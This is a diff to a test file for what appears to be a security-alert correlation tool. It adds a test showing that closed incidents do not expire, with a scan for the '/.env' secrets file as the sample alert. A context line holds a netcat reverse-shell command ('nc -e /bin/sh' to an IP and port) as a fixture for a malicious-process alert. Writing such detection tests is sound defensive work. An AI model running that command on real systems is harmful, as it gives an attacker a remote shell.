@@ -182,6 +182,17 @@ test("an incident expires when its window runs out, and the next alert opens a n
   assert.deepEqual([...live.keys()], ["0002"]);
 });
 
+test("an approved incident is decided: it never expires, and a continuing attack opens a new one", () => {
+  const { c, live, expired } = setup();
+  hit(c, "web_scan", { event_type: "http_request", path: "/.env" });
+  assert.deepEqual(c.rowsOf("0001").length, 1);
+  c.close("0001");
+  c.tick(T0 + 20 * 60_000);
+  assert.deepEqual(expired, []);
+  hit(c, "web_scan", { event_type: "http_request", path: "/.env" }, T0 + 60_000);
+  assert.ok(live.has("0002"));
+});
+
 test("an admin who ran suspicious commands and then moved data out is one incident", () => {
   const { c, live } = setup();
   hit(c, "malicious_process", { user: "admin1", event_type: "process_start", process: "nc -e /bin/sh 10.0.0.1 4444" }, T0, { severity: "critical" });
